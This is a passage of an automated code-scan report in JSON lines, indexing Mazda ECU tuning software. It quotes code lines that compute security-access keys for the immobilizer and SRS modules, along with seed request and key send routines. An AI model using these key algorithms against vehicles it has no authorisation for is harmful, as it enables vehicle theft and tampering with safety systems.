vehicle-specific key."}, {"type": "security_pattern", "line": 147, "pattern": "encrypt", "content": "Uses 3DES encryption with a vehicle-specific key."}, {"type": "security_pattern", "line": 149, "pattern": "seed", "content": "if not credentials.seed or len(credentials.seed) != 8:"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "raise ValueError(\"Immobilizer 3DES requires an 8-byte seed\")"}, {"type": "security_pattern", "line": 152, "pattern": "key", "content": "if not credentials.key or len(credentials.key) != 16:"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "raise ValueError(\"Immobilizer 3DES requires a 16-byte key\")"}, {"type": "security_pattern", "line": 156, "pattern": "key", "content": "key_3des = credentials.key + credentials.key[:8]"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "cipher = DES3.new(key_3des, DES3.MODE_ECB)"}, {"type": "security_pattern", "line": 159, "pattern": "cipher", "content": "cipher = DES3.new(key_3des, DES3.MODE_ECB)"}, {"type": "security_pattern", "line": 162, "pattern": "encrypt", "content": "encrypted = cipher.encrypt(credentials.seed)"}, {"type": "security_pattern", "line": 162, "pattern": "seed", "content": "encrypted = cipher.encrypt(credentials.seed)"}, {"type": "security_pattern", "line": 162, "pattern": "cipher", "content": "encrypted = cipher.encrypt(credentials.seed)"}, {"type": "security_pattern", "line": 166, "pattern": "encrypt", "content": "encrypted = bytes(a ^ b for a, b in zip(encrypted, self.M12R_V34_CONSTANTS[:8]))"}, {"type": "security_pattern", "line": 168, "pattern": "encrypt", "content": "return encrypted"}, {"type": "security_pattern", "line": 172, "pattern": "key", "content": "Compute SRS enhanced security key."}, {"type": "security_pattern", "line": 174, "pattern": "algorithm", "content": "More complex algorithm used in SRS (airbag) modules."}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "if not credentials.seed or len(credentials.seed) != 4:"}, {"type": "security_pattern", "line": 177, "pattern": "seed", "content": "raise ValueError(\"SRS enhanced requires a 4-byte seed\")"}, {"type": "security_pattern", "line": 183, "pattern": "key", "content": "ecu_key = credentials.ecu_serial[:8]"}, {"type": "security_pattern", "line": 186, "pattern": "seed", "content": "seed = struct.unpack(\">I\", credentials.seed)[0]"}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "security_pattern", "line": 187, "pattern": "seed", "content": "key = seed ^ 0x5A5A5A5A"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "ecu_int = int.from_bytes(ecu_key, 'big')"}, {"type": "security_pattern", "line": 191, "pattern": "key", "content": "key = (key + ecu_int) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key = ((key >> 16) | (key << 16)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "key ^= 0xFFFFFFFF"}, {"type": "security_pattern", "line": 199, "pattern": "key", "content": "key = (key + srs_const) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 203, "pattern": "key", "content": "key = ((key & 0x00FF00FF) << 8) | ((key & 0xFF00FF00) >> 8)"}, {"type": "security_pattern", "line": 204, "pattern": "key", "content": "key ^= 0x5A5A5A5A"}, {"type": "security_pattern", "line": 206, "pattern": "key", "content": "return struct.pack(\">I\", key)"}, {"type": "security_pattern", "line": 208, "pattern": "key", "content": "def verify_key(self, credentials: SecurityCredentials, expected_key: bytes) -> bool:"}, {"type": "security_pattern", "line": 210, "pattern": "key", "content": "Verify if the computed key matches the expected key."}, {"type": "security_pattern", "line": 213, "pattern": "algorithm", "content": "credentials: SecurityCredentials with algorithm and parameters"}, {"type": "security_pattern", "line": 214, "pattern": "key", "content": "expected_key: Expected key to verify against"}, {"type": "security_pattern", "line": 217, "pattern": "key", "content": "bool: True if computed key matches expected key"}, {"type": "security_pattern", "line": 219, "pattern": "key", "content": "computed_key = self.compute_key(credentials)"}, {"type": "security_pattern", "line": 220, "pattern": "key", "content": "return computed_key == expected_key"}, {"type": "security_pattern", "line": 222, "pattern": "key", "content": "def set_session_key(self, level: SecurityLevel, key: bytes) -> None:"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "Store a session key for the specified security level."}, {"type": "security_pattern", "line": 227, "pattern": "key", "content": "level: Security level for this key"}, {"type": "security_pattern", "line": 228, "pattern": "key", "content": "key: The session key to store"}, {"type": "security_pattern", "line": 230, "pattern": "key", "content": "self._session_keys[level] = key"}, {"type": "security_pattern", "line": 232, "pattern": "key", "content": "def get_session_key(self, level: SecurityLevel) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 234, "pattern": "key", "content": "Retrieve a stored session key."}, {"type": "security_pattern", "line": 237, "pattern": "key", "content": "level: Security level of the key to retrieve"}, {"type": "security_pattern", "line": 240, "pattern": "key", "content": "Optional[bytes]: The stored key, or None if not found"}, {"type": "security_pattern", "line": 242, "pattern": "key", "content": "return self._session_keys.get(level)"}, {"type": "security_pattern", "line": 244, "pattern": "key", "content": "def clear_session_keys(self) -> None:"}, {"type": "security_pattern", "line": 245, "pattern": "key", "content": "\"\"\"Clear all stored session keys.\"\"\""}, {"type": "security_pattern", "line": 246, "pattern": "key", "content": "self._session_keys.clear()"}, {"type": "security_pattern", "line": 250, "pattern": "algorithm", "content": "SecurityAlgorithm.M12R_V3_4: ["}, {"type": "security_pattern", "line": 256, "pattern": "algorithm", "content": "SecurityAlgorithm.TCM_XOR: ["}, {"type": "security_pattern", "line": 269, "pattern": "seed", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.M12R_V3_4]):"}, {"type": "security_pattern", "line": 269, "pattern": "algorithm", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.M12R_V3_4]):"}, {"type": "security_pattern", "line": 271, "pattern": "algorithm", "content": "algorithm=SecurityAlgorithm.M12R_V3_4,"}, {"type": "security_pattern", "line": 273, "pattern": "seed", "content": "seed=seed"}, {"type": "security_pattern", "line": 275, "pattern": "key", "content": "result = security.compute_key(creds)"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.TCM_XOR]):"}, {"type": "security_pattern", "line": 280, "pattern": "algorithm", "content": "for i, (seed, level, expected) in enumerate(TEST_VECTORS[SecurityAlgorithm.TCM_XOR]):"}, {"type": "security_pattern", "line": 282, "pattern": "algorithm", "content": "algorithm=SecurityAlgorithm.TCM_XOR,"}, {"type": "security_pattern", "line": 284, "pattern": "seed", "content": "seed=seed"}, {"type": "security_pattern", "line": 286, "pattern": "key", "content": "result = security.compute_key(creds)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "MazdaSpeed3TuningSoftware.py", "lines_read": 722, "features_found": [{"type": "function", "name": "update_parameter", "line": 54}, {"type": "function", "name": "get_parameter", "line": 61}, {"type": "function", "name": "__init__", "line": 73}, {"type": "function", "name": "_initialize_default_profiles", "line": 112}, {"type": "function", "name": "load_tune", "line": 335}, {"type": "function", "name": "save_tune", "line": 354}, {"type": "function", "name": "update_parameter", "line": 388}, {"type": "function", "name": "_validate_parameter", "line": 420}, {"type": "function", "name": "_apply_parameter_change", "line": 440}, {"type": "function", "name": "_write_ecu_parameter", "line": 488}, {"type": "function", "name": "register_callback", "line": 505}, {"type": "function", "name": "_trigger_callbacks", "line": 516}, {"type": "function", "name": "get_vehicle_info", "line": 524}, {"type": "function", "name": "_parse_dtc", "line": 575}, {"type": "function", "name": "_parse_freeze_frame", "line": 600}, {"type": "function", "name": "on_connect", "line": 656}, {"type": "function", "name": "on_disconnect", "line": 659}, {"type": "function", "name": "on_error", "line": 662}, {"type": "function", "name": "on_tune_loaded", "line": 665}, {"type": "function", "name": "on_parameter_changed", "line": 668}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "MazdaOBDService", "line": null}, {"type": "import", "module": "MazdaCANEngine", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "OBDService,", "line": null}, {"type": "import", "module": "MazdaCANEngine,", "line": null}, {"type": "import", "module": "SecurityAlgorithm,", "line": null}], "components_found": [{"type": "class", "name": "TuningMode", "line": 23}, {"type": "class", "name": "TuningParameter", "line": 30}, {"type": "class", "name": "TuneProfile", "line": 45}, {"type": "class", "name": "MazdaSpeed3TuningSoftware", "line": 65}], "algorithms": [], "protocols": [{"type": "protocol", "line": 16, "protocol": "OBD", "content": "from MazdaOBDService import OBDService, OBDProtocol"}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "from MazdaCANEngine import MazdaCANEngine, CANMessageID"}, {"type": "protocol", "line": 69, "protocol": "CAN", "content": "Integrates OBD, CAN, and security components to provide"}, {"type": "protocol", "line": 69, "protocol": "OBD", "content": "Integrates OBD, CAN, and security components to provide"}, {"type": "protocol", "line": 76, "protocol": "OBD", "content": "self.obd_service = OBDService()"}, {"type": "protocol", "line": 77, "protocol": "CAN", "content": "self.can_engine = MazdaCANEngine(self.obd_service)"}, {"type": "protocol", "line": 199, "protocol": "OBD", "content": "logger.error(\"Failed to connect to OBD service\")"}, {"type": "protocol", "line": 204, "protocol": "CAN", "content": "logger.error(\"Failed to connect to CAN bus\")"}, {"type": "protocol", "line": 303, "protocol": "0x[0-9A-Fa-f]+", "content": "command = bytes([0x27, level.value, 0x01])"}, {"type": "protocol", "line": 308, "protocol": "0x[0-9A-Fa-f]+", "content": "if response[0] == 0x67 and response[1] == level.value:"}, {"type": "protocol", "line": 322, "protocol": "0x[0-9A-Fa-f]+", "content": "command = bytes([0x27, level.value, 0x02]) + key"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "return response[0] == 0x67 and response[1] == level.value and response[2] == 0x02"}, {"type": "protocol", "line": 446, "protocol": "0x[0-9A-Fa-f]+", "content": "self._write_ecu_parameter(0x1234, kpa)  # Example address"}, {"type": "protocol", "line": 449, "protocol": "0x[0-9A-Fa-f]+", "content": "self._write_ecu_parameter(0x1235, int(value))"}, {"type": "protocol", "line": 454, "protocol": "0x[0-9A-Fa-f]+", "content": "self._write_ecu_parameter(0x1236, timing)"}, {"type": "protocol", "line": 459, "protocol": "0x[0-9A-Fa-f]+", "content": "self._write_ecu_parameter(0x1237, rpm_value)"}, {"type": "protocol", "line": 464, "protocol": "0x[0-9A-Fa-f]+", "content": "self._write_ecu_parameter(0x1238, speed_value)"}, {"type": "protocol", "line": 494, "protocol": "0x[0-9A-Fa-f]+", "content": "if 0 <= value <= 0xFF:"}, {"type": "protocol", "line": 502, "protocol": "0x[0-9A-Fa-f]+", "content": "if not success or not response or response[0] != 0x6E:"}, {"type": "protocol", "line": 546, "protocol": "0x[0-9A-Fa-f]+", "content": "if dtc_response[0] == 0x43 and len(dtc_response) > 1:"}, {"type": "protocol", "line": 558, "protocol": "0x[0-9A-Fa-f]+", "content": "if success and ff_response and ff_response[0] == 0x42:"}, {"type": "protocol", "line": 584, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (byte1 >> 6) & 0x03"}, {"type": "protocol", "line": 587, "protocol": "0x[0-9A-Fa-f]+", "content": "code = ((byte1 & 0x3F) << 8) | byte2"}, {"type": "protocol", "line": 623, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: 'engine_load',"}, {"type": "protocol", "line": 624, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: 'coolant_temp',"}, {"type": "protocol", "line": 625, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0A: 'fuel_pressure',"}, {"type": "protocol", "line": 626, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0B: 'map',"}, {"type": "protocol", "line": 627, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: 'rpm',"}, {"type": "protocol", "line": 628, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: 'speed',"}, {"type": "protocol", "line": 629, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: 'intake_temp',"}, {"type": "protocol", "line": 630, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: 'maf_flow',"}, {"type": "protocol", "line": 631, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: 'throttle_pos',"}, {"type": "protocol", "line": 632, "protocol": "0x[0-9A-Fa-f]+", "content": "0x1F: 'runtime_since_start',"}, {"type": "protocol", "line": 633, "protocol": "0x[0-9A-Fa-f]+", "content": "0x21: 'distance_with_mil',"}, {"type": "protocol", "line": 634, "protocol": "0x[0-9A-Fa-f]+", "content": "0x2F: 'fuel_level',"}, {"type": "protocol", "line": 635, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31: 'distance_since_codes_clear',"}, {"type": "protocol", "line": 636, "protocol": "0x[0-9A-Fa-f]+", "content": "0x42: 'control_module_voltage'"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "vehicle", "content": "MazdaSpeed3TuningSoftware - Core tuning software for Mazdaspeed 3 vehicles."}, {"type": "hardware", "line": 5, "hardware": "vehicle", "content": "to provide a complete tuning solution for Mazdaspeed 3 vehicles."}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "from MazdaSecurityCore import SecurityAlgorithm, SecurityLevel, SecurityCredentials, MazdaSecurityCo"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "Integrates OBD, CAN, and security components to provide"}, {"type": "hardware", "line": 70, "hardware": "vehicle", "content": "a complete tuning solution for Mazdaspeed 3 vehicles."}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "self.security_core = MazdaSecurityCore()"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "self.vehicle_vin: Optional[str] = None"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "self.ecu_serial: Optional[bytes] = None"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "self.security_level: SecurityLevel = SecurityLevel.LEVEL_0"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "'on_security_level_changed': []"}, {"type": "hardware", "line": 191, "hardware": "vehicle", "content": "Connect to the vehicle."}, {"type": "hardware", "line": 204, "hardware": "CAN bus", "content": "logger.error(\"Failed to connect to CAN bus\")"}, {"type": "hardware", "line": 211, "hardware": "vehicle", "content": "self.vehicle_vin = await self._read_vin()"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "await self._initialize_security()"}, {"type": "hardware", "line": 218, "hardware": "vehicle", "content": "logger.info(f\"Connected to vehicle: {self.vehicle_vin}\")"}, {"type": "hardware", "line": 227, "hardware": "vehicle", "content": "\"\"\"Disconnect from the vehicle.\"\"\""}, {"type": "hardware", "line": 237, "hardware": "vehicle", "content": "self.vehicle_vin = None"}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "self.security_level = SecurityLevel.LEVEL_0"}, {"type": "hardware", "line": 241, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 248, "hardware": "vehicle", "content": "\"\"\"Read vehicle VIN.\"\"\""}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "async def _initialize_security(self) -> None:"}, {"type": "hardware", "line": 265, "hardware": "ECU", "content": "\"\"\"Initialize security access.\"\"\""}, {"type": "hardware", "line": 268, "hardware": "ECU", "content": "credentials = SecurityCredentials("}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "algorithm=SecurityAlgorithm.M12R_V3_4,"}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "level=SecurityLevel.LEVEL_1,"}, {"type": "hardware", "line": 271, "hardware": "vehicle", "content": "vin=self.vehicle_vin,"}, {"type": "hardware", "line": 272, "hardware": "ECU", "content": "ecu_serial=self.ecu_serial"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "logger.warning(\"Failed to get security seed\")"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "key = self.security_core.compute_key(credentials)"}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "logger.warning(\"Failed to compute security key\")"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "self.security_level = credentials.level"}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "self._trigger_callbacks('on_security_level_changed', self.security_level)"}, {"type": "hardware", "line": 293, "hardware": "ECU", "content": "logger.info(f\"Security level upgraded to {credentials.level}\")"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "logger.error(f\"Security initialization failed: {e}\")"}, {"type": "hardware", "line": 297, "hardware": "ECU", "content": "self._trigger_callbacks('on_error', f\"Security error: {e}\")"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "async def _request_seed(self, level: SecurityLevel) -> Tuple[bool, Optional[bytes]]:"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "\"\"\"Request a security seed from the ECU.\"\"\""}, {"type": "hardware", "line": 318, "hardware": "ECU", "content": "async def _send_key(self, level: SecurityLevel, key: bytes) -> bool:"}, {"type": "hardware", "line": 319, "hardware": "ECU", "content": "\"\"\"Send a security key to the ECU.\"\"\""}, {"type": "hardware", "line": 441, "hardware": "ECU", "content": "\"\"\"Apply a parameter change to the ECU.\"\"\""}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "self._write_ecu_parameter(0x1234, kpa)  # Example address"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "self._write_ecu_parameter(0x1235, int(value))"}, {"type": "hardware", "line": 454, "hardware": "ECU", "content": "self._write_ecu_parameter(0x1236, timing)"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "self._write_ecu_parameter(0x1237, rpm_value)"}, {"type": "hardware", "line": 464, "hardware": "ECU", "content": "self._write_ecu_parameter(0x1238, speed_value)"}, {"type": "hardware", "line": 488, "hardware": "ECU", "content": "def _write_ecu_parameter(self, address: int, value: int) -> None:"}, {"type": "hardware", "line": 489, "hardware": "ECU", "content": "\"\"\"Write a parameter to the ECU.\"\"\""}, {"type": "hardware", "line": 503, "hardware": "ECU", "content": "raise Exception(f\"Failed to write to ECU address 0x{address:04X}\")"}, {"type": "hardware", "line": 524, "hardware": "vehicle", "content": "def get_vehicle_info(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 525, "hardware": "vehicle", "content": "\"\"\"Get vehicle information.\"\"\""}, {"type": "hardware", "line": 527, "hardware": "vehicle", "content": "'vin': self.vehicle_vin,"}, {"type": "hardware", "line": 529, "hardware": "ECU", "content": "'security_level': self.security_level.name,"}, {"type": "hardware", "line": 657, "hardware": "vehicle", "content": "print(\"Connected to vehicle!\")"}, {"type": "hardware", "line": 660, "hardware": "vehicle", "content": "print(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 679, "hardware": "vehicle", "content": "print(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 681, "hardware": "vehicle", "content": "print(\"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 685, "hardware": "vehicle", "content": "info = tuner.get_vehicle_info()"}, {"type": "hardware", "line": 686, "hardware": "vehicle", "content": "print(f\"Connected to vehicle: VIN={info['vin']}\")"}, {"type": "hardware", "line": 704, "hardware": "vehicle", "content": "print(\"Monitoring vehicle for 30 seconds...\")"}], "security_logic": [{"type": "security_pattern", "line": 18, "pattern": "algorithm", "content": "from MazdaSecurityCore import SecurityAlgorithm, SecurityLevel, SecurityCredentials, MazdaSecurityCo"}, {"type": "security_pattern", "line": 269, "pattern": "algorithm", "content": "algorithm=SecurityAlgorithm.M12R_V3_4,"}, {"type": "security_pattern", "line": 276, "pattern": "seed", "content": "success, seed = await self._request_seed(credentials.level)"}, {"type": "security_pattern", "line": 277, "pattern": "seed", "content": "if not success or not seed:"}, {"type": "security_pattern", "line": 278, "pattern": "seed", "content": "logger.warning(\"Failed to get security seed\")"}, {"type": "security_pattern", "line": 282, "pattern": "seed", "content": "credentials.seed = seed"}, {"type": "security_pattern", "line": 283, "pattern": "key", "content": "key = self.security_core.compute_key(credentials)"}, {"type": "security_pattern", "line": 284, "pattern": "key", "content": "if not key:"}, {"type": "security_pattern", "line": 285, "pattern": "key", "content": "logger.warning(\"Failed to compute security key\")"}, {"type": "security_pattern", "line": 289, "pattern": "key", "content": "success = await self._send_key(credentials.level, key)"}, {"type": "security_pattern", "line": 299, "pattern": "seed", "content": "async def _request_seed(self, level: SecurityLevel) -> Tuple[bool, Optional[bytes]]:"}, {"type": "security_pattern", "line": 300, "pattern": "seed", "content": "\"\"\"Request a security seed from the ECU.\"\"\""}, {"type": "security_pattern", "line": 309, "pattern": "seed", "content": "seed = response[2:]"}, {"type": "security_pattern", "line": 310, "pattern": "seed", "content": "return True, seed"}, {"type": "security_pattern", "line": 315, "pattern": "seed", "content": "logger.error(f\"Error requesting seed: {e}\")"}, {"type": "security_pattern", "line": 318, "pattern": "key", "content": "async def _send_key(self, level: SecurityLevel, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 319, "pattern": "key", "content": "\"\"\"Send a security key to the ECU.\"\"\""}, {"type": "security_pattern", "line": 322, "pattern": "key", "content": "command = bytes([0x27, level.value, 0x02]) + key"}, {"type": "security_pattern", "line": 332, "pattern": "key", "content": "logger.error(f\"Error sending key: {e}\")"}, {"type": "security_pattern", "line": 707, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [{"type": "todo", "line": 422, "content": "# TODO: Implement proper validation for each parameter type"}], "risks": [], "group_tags": ["tuning"]}
{"file_path": "MazdaTunerAPI.py", "lines_read": 1906, "features_found": [{"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "aiohttp.web", "line": null}, {"type": "import", "module": "aiohttp.web_exceptions", "line": null}, {"type": "import", "module": "aiohttp.web_middlewares", "line": null}, {"type": "import", "module": "aiohttp_swagger", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "functools", "line": null}, {"type": "import", "module": "jinja2", "line": null}, {"type": "import", "module": "SecureDatabase", "line": null}, {"type": "import", "module": "MazdaCANEngine", "line": null}, {"type": "import", "module": "RealTimeAITuner", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "uuid", "line": null}, {"type": "import", "module": "datetime,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "aiohttp.web", "line": null}, {"type": "import", "module": "aiohttp_jinja2", "line": null}, {"type": "import", "module": "aiohttp_session", "line": null}, {"type": "import", "module": "aiohttp_session.cookie_storage", "line": null}, {"type": "import", "module": "async_timeout", "line": null}, {"type": "import", "module": "jwt", "line": null}, {"type": "import", "module": "WSMsgType", "line": null}, {"type": "import", "module": "Request,", "line": null}, {"type": "import", "module": "HTTPException,", "line": null}, {"type": "import", "module": "middleware", "line": null}, {"type": "import", "module": "setup_swagger", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "wraps", "line": null}, {"type": "import", "module": "FileSystemLoader", "line": null}, {"type": "import", "module": "SecureDatabase,", "line": null}, {"type": "import", "module": "MazdaCANEngine", "line": null}, {"type": "import", "module": "RealTimeAITuner,", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 37, "protocol": "CAN", "content": "from MazdaCANEngine import MazdaCANEngine"}, {"type": "protocol", "line": 128, "protocol": "CAN", "content": "can_engine: Optional[MazdaCANEngine] = None"}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "logger.error(f\"Error disconnecting CAN engine: {e}\")"}, {"type": "protocol", "line": 650, "protocol": "CAN", "content": "can_engine = MazdaCANEngine()"}, {"type": "protocol", "line": 917, "protocol": "CAN", "content": "raise APIError(f\"Diagnostic scan failed: {str(e)}\", 500, \"DIAGNOSTIC_SCAN_FAILED\")"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "vehicle", "content": "MazdaTunerAPI - High-performance async REST API for Mazda vehicle tuning."}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "This module provides a comprehensive API for interacting with Mazda vehicles,"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "from SecureDatabase import SecureDatabase, User, Vehicle, TuneSession, DiagnosticLog, SecurityLog, U"}, {"type": "hardware", "line": 36, "hardware": "vehicle", "content": "from SecureDatabase import SecureDatabase, User, Vehicle, TuneSession, DiagnosticLog, SecurityLog, U"}, {"type": "hardware", "line": 86, "hardware": "vehicle", "content": "class VehicleConnectionError(APIError):"}, {"type": "hardware", "line": 87, "hardware": "vehicle", "content": "\"\"\"Vehicle connection error.\"\"\""}, {"type": "hardware", "line": 88, "hardware": "vehicle", "content": "def __init__(self, message: str = \"Vehicle connection failed\"):"}, {"type": "hardware", "line": 89, "hardware": "vehicle", "content": "super().__init__(message, 503, \"VEHICLE_CONNECTION_ERROR\")"}, {"type": "hardware", "line": 121, "hardware": "vehicle", "content": "class VehicleConnection:"}, {"type": "hardware", "line": 122, "hardware": "vehicle", "content": "\"\"\"Active vehicle connection.\"\"\""}, {"type": "hardware", "line": 124, "hardware": "vehicle", "content": "vehicle_id: int"}, {"type": "hardware", "line": 133, "hardware": "vehicle", "content": "\"\"\"Close the vehicle connection and clean up resources.\"\"\""}, {"type": "hardware", "line": 164, "hardware": "ECU", "content": "self.db = SecureDatabase(db_path)"}, {"type": "hardware", "line": 167, "hardware": "vehicle", "content": "self.connections: Dict[str, VehicleConnection] = {}"}, {"type": "hardware", "line": 290, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/connect\", self.connect_vehicle)"}, {"type": "hardware", "line": 291, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/disconnect\", self.disconnect_vehicle"}, {"type": "hardware", "line": 292, "hardware": "vehicle", "content": "self.app.router.add_get(f\"{API_PREFIX}/vehicles\", self.list_vehicles)"}, {"type": "hardware", "line": 293, "hardware": "vehicle", "content": "self.app.router.add_get(f\"{API_PREFIX}/vehicles/{{vehicle_id}}\", self.get_vehicle)"}, {"type": "hardware", "line": 294, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles\", self.add_vehicle)"}, {"type": "hardware", "line": 295, "hardware": "vehicle", "content": "self.app.router.add_put(f\"{API_PREFIX}/vehicles/{{vehicle_id}}\", self.update_vehicle)"}, {"type": "hardware", "line": 296, "hardware": "vehicle", "content": "self.app.router.add_delete(f\"{API_PREFIX}/vehicles/{{vehicle_id}}\", self.delete_vehicle)"}, {"type": "hardware", "line": 299, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/diagnostics/scan\", self.scan_diagnos"}, {"type": "hardware", "line": 300, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/diagnostics/clear\", self.clear_diagn"}, {"type": "hardware", "line": 301, "hardware": "vehicle", "content": "self.app.router.add_get(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/diagnostics\", self.get_diagnostic_log"}, {"type": "hardware", "line": 304, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/tunes/generate\", self.generate_tune)"}, {"type": "hardware", "line": 305, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/tunes/optimize\", self.optimize_tune)"}, {"type": "hardware", "line": 306, "hardware": "vehicle", "content": "self.app.router.add_post(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/tunes/flash\", self.flash_tune)"}, {"type": "hardware", "line": 307, "hardware": "vehicle", "content": "self.app.router.add_get(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/tunes\", self.list_tunes)"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "self.app.router.add_get(f\"{API_PREFIX}/vehicles/{{vehicle_id}}/stream\", self.data_stream)"}, {"type": "hardware", "line": 324, "hardware": "vehicle", "content": "description=\"REST API for Mazda vehicle tuning and diagnostics\","}, {"type": "hardware", "line": 399, "hardware": "vehicle", "content": "def _validate_vehicle_ownership(self, user: UserSession, vehicle_id: int) -> Vehicle:"}, {"type": "hardware", "line": 400, "hardware": "vehicle", "content": "\"\"\"Validate that the user owns the vehicle.\"\"\""}, {"type": "hardware", "line": 402, "hardware": "vehicle", "content": "vehicle = self.db.get_vehicle(vehicle_id)"}, {"type": "hardware", "line": 404, "hardware": "vehicle", "content": "vehicle = next("}, {"type": "hardware", "line": 405, "hardware": "vehicle", "content": "(v for v in self.db.get_vehicles_by_owner(user.user_id) if v.id == vehicle_id),"}, {"type": "hardware", "line": 409, "hardware": "vehicle", "content": "if not vehicle:"}, {"type": "hardware", "line": 410, "hardware": "vehicle", "content": "raise PermissionDenied(\"Vehicle not found or access denied\")"}, {"type": "hardware", "line": 412, "hardware": "vehicle", "content": "return vehicle"}, {"type": "hardware", "line": 414, "hardware": "vehicle", "content": "def _get_connection(self, connection_id: str) -> VehicleConnection:"}, {"type": "hardware", "line": 415, "hardware": "vehicle", "content": "\"\"\"Get an active vehicle connection.\"\"\""}, {"type": "hardware", "line": 418, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection found\")"}, {"type": "hardware", "line": 615, "hardware": "vehicle", "content": 